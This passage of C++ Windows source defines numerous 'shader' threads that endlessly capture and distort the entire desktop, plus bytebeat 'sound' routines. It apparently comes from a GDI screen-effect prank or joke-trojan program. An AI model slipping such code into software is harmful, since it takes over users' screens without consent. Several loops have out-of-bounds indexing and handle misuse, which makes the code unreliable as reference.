    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pBits = nullptr;

    srand(time(NULL));

    while (true) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                int index = x ^ y * w;

                BYTE originalRed = pBits[index].rgbRed;
                BYTE originalGreen = pBits[index].rgbGreen;
                BYTE originalBlue = pBits[index].rgbBlue;

                BYTE fractalRed = (x ^ y) * 9;
                BYTE fractalGreen = (x ^ y) * 9;
                BYTE fractalBlue = x ^ y ^ 9;

                pBits[index].rgbRed = static_cast<BYTE>(0.5 * originalRed + 0.5 * fractalRed);
                pBits[index].rgbGreen = static_cast<BYTE>(0.5 * originalGreen + 0.5 * fractalGreen);
                pBits[index].rgbBlue = static_cast<BYTE>(0.5 * originalBlue + 0.5 * fractalBlue);

                pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.8);
                pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.8));
                pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.8);

                pBits[index].rgbRed = static_cast<BYTE>(0.3 * fractalBlue + 0.6 * fractalGreen);
                pBits[index].rgbGreen = static_cast<BYTE>(0.3 * fractalRed + 0.6 * fractalBlue);
                pBits[index].rgbBlue = static_cast<BYTE>(0.3 * fractalGreen + 0.6 * fractalRed);
            }
        }
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 50;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}
DWORD WINAPI shader4(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += i * (int)cbrt(x^y);
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
    return 0;
}
DWORD WINAPI shader5(LPVOID lpParam) {
    int xxx = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y + x * h;
                double wave = tan((x + xxx) * 0.03) + sqrt((y + xxx) * 0.03);
                pBits[index].rgbRed = (256 * sqrt(wave) * 0.9);
                pBits[index].rgbGreen = (512 * tan(wave) * 1.4);
                pBits[index].rgbBlue = (1024 * tan(wave) * 1.8);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx += 10;
        Sleep(1);
    }
    return 0;
}
DWORD WINAPI shader6(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = ((x + (10 * i)) ^ y) + (i * 10);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 200.f + y / h * .2f, 1.f);
                hslcolor.s = 1.f;  hslcolor.l += 1.f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}
DWORD WINAPI shader7(LPVOID lpParam) {
    g_shader7_running = true;
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0; g_shader7_running; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) -= 25;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
        Sleep(1);
    }
    VirtualFree(data, 0, MEM_RELEASE);
    return 0;
}
DWORD WINAPI shader8(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;
                int g = (rgbquad[index].rgbBlue + rgbquad[index].rgbGreen + rgbquad[index].rgbRed) / 3;

                int fx = (int)((i ^ 4) + (i * 4) * cbrt(g * 3));

                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}
DWORD WINAPI shader9a(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;

    PRGBQUAD prgbScreen;
    HDC hcdc = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
    SelectObject(hcdc, hBitmap);

    for (; ; ) {
        hdc = GetDC(NULL);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, 13369376);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int rgb = (prgbScreen[x + w * y].r + prgbScreen[x + w * y].g + prgbScreen[x + w * y].b) / 3;
                prgbScreen[x + w * y].r = rgb;
                prgbScreen[x + w * y].g = rgb;
                prgbScreen[x + w * y].b = rgb;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, 13369376);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        Sleep(100);
    }

    ReleaseDC(NULL, hcdc);
    DeleteObject(hcdc);
    DeleteObject(hBitmap);
    return 0;
}

DWORD WINAPI shader9b(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    PRGBQUAD prgbScreen;
    HDC hcdc = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
    SelectObject(hcdc, hBitmap);
    for (;;) {
        hdc = GetDC(NULL);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < h; i++) {
            for (int j = 0; j < w; j++) {
                int y = (i + rand() % 11 - 5);
                if (y < 0) {
                    y = -y;
                }
                int x = (j + rand() % 11 - 5);
                if (x < 0) {
                    x = -x;
                }
                prgbScreen[i * w + j].rgb = prgbScreen[(y * w + x) % (w * h)].rgb;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        Sleep(10);
    }
    DeleteObject(hBitmap);
    DeleteDC(hcdc);

    return 0;
}
DWORD WINAPI shader10(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i / w, y = i % w;
            rgbScreen[i].r ^= x ^ y;
            rgbScreen[i].rgb += 720;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(10);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
    return 0;
}
DWORD WINAPI shader10b(LPVOID lpParam) {
    int start = GetTickCount();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            for(float i = 0; i < sw + sh; i += 0.99f) {
                int a = (int)(sin(angle) * 50);
                BitBlt(hdc, 0, (int)i, sw, 1, hdc, a, (int)i, SRCCOPY);
                angle += PI / 60;
            }
            ReleaseDC(0, hdc);
        }
        Sleep(16);
    }
    return 0;
}
DWORD WINAPI shader10c(LPVOID lpParam) {
    int start = GetTickCount();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            int rx = rand() % sw;
            BitBlt(hdc, rx, 10, 100, sh, hdc, rx, 0, SRCCOPY);
            BitBlt(hdc, rx, -10, -100, sh, hdc, rx, 0, SRCCOPY);
            ReleaseDC(0, hdc);
        }
        Sleep(1);
    }
    return 0;
}
DWORD WINAPI shader11(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
    BITMAPINFO bmpi={0}; bmpi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmpi.bmiHeader.biWidth=w; bmpi.bmiHeader.biHeight=h;
    bmpi.bmiHeader.biPlanes=1; bmpi.bmiHeader.biBitCount=32;
    bmpi.bmiHeader.biCompression=BI_RGB;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&data, 0, 0);
    SelectObject(mem,bmp);
    int i=0;
    while (true) {
        hdc = GetDC(0);
        StretchBlt(mem,0,0,w,h,hdc,0,0,w,h,SRCCOPY);
        for (int x=0; x<w; x++) for (int y=0; y<h; y++) {
            int idx = y*w + x;
            int fx = (x & (i*4)) * (y | (i*4));
            RGBQUAD tmp;
            tmp.rgbRed = data[idx].r;
            tmp.rgbGreen = data[idx].g;
            tmp.rgbBlue = data[idx].b;
            HSL hsl = Colors::rgb2hsl(tmp);
            hsl.h = fmod(fx/300.f + y/(float)h*0.1f + i/1000.f, 1.f);
            hsl.s = 0.7f; hsl.l = 0.5f;
            RGBQUAD res = Colors::hsl2rgb(hsl);
            data[idx].r = res.rgbRed;
            data[idx].g = res.rgbGreen;
            data[idx].b = res.rgbBlue;
        }
        i++;
        StretchBlt(hdc,0,0,w,h,mem,0,0,w,h,SRCCOPY);
        ReleaseDC(0,hdc);
    }
    return 0;
}
DWORD WINAPI shader12(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, w, h, 1, 24 };
    RGBTRIPLE* rgbtriple;
    for (;;) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int sepiaRed = round(.114 * rgbtriple[i].rgbtRed + .514 * rgbtriple[i].rgbtGreen + .191 * rgbtriple[i].rgbtBlue);
            int sepiaGreen = round(.191 * rgbtriple[i].rgbtRed + .888 * rgbtriple[i].rgbtGreen + .256 * rgbtriple[i].rgbtBlue);
            int sepiaBlue = round(.365 * rgbtriple[i].rgbtRed + .666 * rgbtriple[i].rgbtGreen + .222 * rgbtriple[i].rgbtBlue);

            if (sepiaBlue > 255)
            {
                sepiaBlue = 255;
            }

            if (sepiaRed > 255)
            {
                sepiaRed = 255;
            }

            if (sepiaGreen > 255)
            {
                sepiaGreen = 255;
            }
            rgbtriple[i].rgbtRed += sepiaRed;
            rgbtriple[i].rgbtGreen -= sepiaGreen;
            rgbtriple[i].rgbtBlue -= sepiaBlue;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}
DWORD WINAPI shader13(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)(x & y) * i;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}
DWORD WINAPI shader14(LPVOID) {
    HDC hdc=GetDC(0), memDC=CreateCompatibleDC(hdc);
    int w=GetSystemMetrics(0), h=GetSystemMetrics(1);
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount=32; bmi.bmiHeader.biPlanes=1;
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=h;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&data, 0, 0);
    SelectObject(memDC,bmp);
    while (true) {
        hdc = GetDC(0);
        BitBlt(memDC,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0; i<w*h; i++)
            data[i].rgb = (data[i].rgb * 2) % RGB(255,255,255);
        BitBlt(hdc,0,0,w,h,memDC,0,0,SRCCOPY);
        ReleaseDC(0,hdc);
    }
    return 0;
}
DWORD WINAPI rgb(LPVOID) {
    int w=GetSystemMetrics(0), h=GetSystemMetrics(1);
    void* bits=VirtualAlloc(0,4*w*(h+1),0x3000,4);
    DWORD start=GetTickCount();
    while (true) {
        HDC hdc=GetDC(0), src=CreateCompatibleDC(hdc);
        HBITMAP bmp=CreateBitmap(w,h,1,32,bits);
        SelectObject(src,bmp);
        BitBlt(src,0,0,w,h,hdc,0,0,0xCC0020);
        GetBitmapBits(bmp,4*w*h,bits);
        int v=0;
        if (GetTickCount()-start > 10) rand();
        for (int j=0; j<w*h; j++) {
            if (!(j%h) && !(rand()%110)) v=rand()%24;
            *((BYTE*)bits + 4*j + v) -= 5;
        }
        SetBitmapBits(bmp,4*w*h,bits);
        BitBlt(hdc,0,0,w,h,src,0,0,0xCC0020);
        DeleteObject(bmp); DeleteDC(src);
        ReleaseDC(0,hdc);
    }
    return 0;
}
DWORD WINAPI idk(LPVOID) {
    HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
    int w=GetSystemMetrics(0), h=GetSystemMetrics(1);
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount=32; bmi.bmiHeader.biPlanes=1;
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=h;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&data, 0, 0);
    SelectObject(mem,bmp);
    while (true) {
        hdc = GetDC(0);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0; i<w*h; i++) {
            int x=i%w, y=i/w;
            COLORREF c = Hue(256);
            data[i].rgb = (x >> y) ? RGB(GetRValue(c), GetGValue(c), GetBValue(c)) : 0;
        }
        BitBlt(hdc,0,0,w,h,mem,0,0,SRCCOPY);
        ReleaseDC(0,hdc);
    }
    return 0;
}
VOID WINAPI sound1() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((0x21cc21cc >> ((t >> 9) & 0x1e)) & 0xf) * t | (~t >> 4));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound2() {
    int nSamplesPerSec = 12050, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((t >> (6 - ((t & 0x1000) != 0) & 0x1f)) | 0x9f) * t);
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound3() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(29 * t * (t >> 7));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound4() {
    int nSamplesPerSec = 12000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(255 & t * (int)(127 & t * (int)(234 & t >> 8 & t >> 3) >> (3 & t >> 14)));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound5() {
    int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((t ^ t >> t) * (15 & 0x78917891 >> (t >> 8 & 28)) + (t >> 1 >> (t >> 11) ^ t >> 12) + (t >> 4 & t & 24)));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound6() {
    int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((t + t >> 11 | (4 << t)) + (t ^ t >> (51 + t ^ t) << 4)));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound7() {
    int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
